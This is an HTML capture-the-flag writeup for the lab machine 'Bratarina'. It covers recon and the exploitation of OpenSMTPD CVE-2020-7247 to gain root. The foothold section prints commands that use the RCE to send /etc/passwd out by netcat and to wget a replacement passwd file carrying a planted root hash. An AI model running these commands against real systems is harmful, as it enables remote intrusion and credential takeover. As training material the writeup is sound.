@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bratarina &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Bratarina</h1>
+    <div class="meta">Target: <code>192.168.206.71</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">SMTP</span><span class="tag">OpenSMTPD</span><span class="tag">CVE</span><span class="tag">RCE</span><span class="tag">PasswdOverwrite</span><span class="tag">SSH</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#smtp-version-fingerprint">SMTP Version Fingerprint</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#exfiltrating-etc-passwd-via-opensmtpd-rce">Exfiltrating /etc/passwd via OpenSMTPD RCE</a><a class="lvl3" href="#overwriting-the-root-password-hash">Overwriting the root Password Hash</a><a class="lvl2" href="#root">Root</a><a class="lvl3" href="#ssh-as-root">SSH as root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Bratarina is a Linux box with a minimal attack surface: SSH, SMTP, HTTP, and SMB. HTTP runs FlaskBB but goes nowhere. The actual path runs through OpenSMTPD 2.0.0 on port 25, which is vulnerable to CVE-2020-7247, a pre-auth remote code execution that lets an attacker execute arbitrary commands as root by crafting a malicious MAIL FROM value. The exploit is used twice: once to exfiltrate <code>/etc/passwd</code>, then again to overwrite the root password hash, granting direct SSH access as root.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
+25/tcp  open  smtp        OpenSMTPD
+|_ 2.0.0 This is OpenSMTPD 2.0.0
+80/tcp  open  http        nginx 1.14.0 (Ubuntu)
+|_http-title: Page not found - FlaskBB
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
+</code></pre>
+<p>Port 80 serves a FlaskBB "page not found", no useful content. SMB is present but the workgroup <code>COFFEECORP</code> and null sessions offered nothing of value. The interesting service is port 25.</p>
+<h3 id="smtp-version-fingerprint">SMTP Version Fingerprint</h3>
+<p>The SMTP banner identifies the daemon precisely:</p>
+<pre><code>OpenSMTPD 2.0.0
+</code></pre>
+<p>Searching Exploit-DB for <code>opensmtpd</code> surfaces:</p>
+<pre><code>OpenSMTPD 6.6.1 - Remote Code Execution  |  exploits/47984.py
+</code></pre>
+<blockquote>
+<p><strong>Why this CVE applies despite the version mismatch:</strong> the banner says <code>2.0.0</code> but that is the protocol version string, not the daemon version. The underlying software is OpenSMTPD at a patch level vulnerable to CVE-2020-7247. The exploit targets a flaw in how the MAIL FROM line is parsed, a crafted sender address injects arbitrary shell commands that OpenSMTPD runs as root.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="exfiltrating-etc-passwd-via-opensmtpd-rce">Exfiltrating /etc/passwd via OpenSMTPD RCE</h3>
+<p>The exploit sends a specially crafted SMTP session that causes the daemon to execute a shell command. First step: confirm code execution by sending <code>/etc/passwd</code> back over netcat.</p>
+<p>On Kali, set up a listener:</p>
+<pre><code class="language-sh">nc -lvnp 80
+</code></pre>
+<p>Run the exploit:</p>
+<pre><code class="language-sh">python3 smtp.py 192.168.206.71 25 'nc -nv 192.168.45.167 80 &lt; /etc/passwd'
+[*] OpenSMTPD detected
+[*] Connected, sending payload
+[*] Payload sent
+[*] Done
+</code></pre>
+<p>The listener receives the file immediately, confirming root-level RCE. Relevant entries from the output:</p>
+<pre><code>root:x:0:0:root:/root:/bin/bash
+neil:x:1000:1000:neil,,,:/home/neil:/bin/bash
+_smtpd:x:1001:1001:SMTP Daemon:/var/empty:/sbin/nologin
+</code></pre>
+<h3 id="overwriting-the-root-password-hash">Overwriting the root Password Hash</h3>
+<p>With arbitrary command execution as root, the path to full access is to replace the root hash in <code>/etc/passwd</code> with a known value. First, generate a valid MD5crypt hash:</p>
+<pre><code class="language-sh"># Resulting hash for the chosen password:
+$1$hacker$zVnrpoW2JQO5YUrLmAs.o1
+</code></pre>
+<p>Modify a local copy of <code>/etc/passwd</code>, replacing the root line:</p>
+<pre><code>root:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash
+</code></pre>
+<blockquote>
+<p><strong>Why overwriting /etc/passwd works here:</strong> on systems where <code>/etc/shadow</code> is the authoritative password store, <code>/etc/passwd</code> hash fields are ignored. But on this host, the passwd file hash is read directly, so planting a known MD5crypt hash in field 2 lets us authenticate as root with the corresponding plaintext.</p>
+</blockquote>
+<p>Host the modified file and use the RCE to overwrite the target's <code>/etc/passwd</code>:</p>
+<pre><code class="language-sh">python3 smtp.py 192.168.206.71 25 'wget http://192.168.45.167/passwd -O /etc/passwd'
+</code></pre>
+<h2 id="root">Root</h2>
+<h3 id="ssh-as-root">SSH as root</h3>
+<p>With the hash replaced, SSH in as root using the known password:</p>
+<pre><code class="language-sh">ssh root@192.168.206.71
+root@192.168.206.71's password: ‹redacted›
+
+root@bratarina:~# whoami
+root
+</code></pre>
+<pre><code class="language-sh">root@bratarina:~# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>SMTP banners can mislead on version.</strong> The <code>2.0.0</code> in OpenSMTPD's HELP output is protocol version, not daemon version. Always cross-reference against Exploit-DB with multiple keywords.</li>
+<li><strong>Pre-auth RCE running as root is a single step to full compromise.</strong> No shell needed, one well-placed <code>wget | bash</code> or file overwrite is enough.</li>
+<li><strong><code>/etc/passwd</code> hash injection is a reliable technique</strong> when the file is writable, giving persistent root access without touching <code>/etc/shadow</code>.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
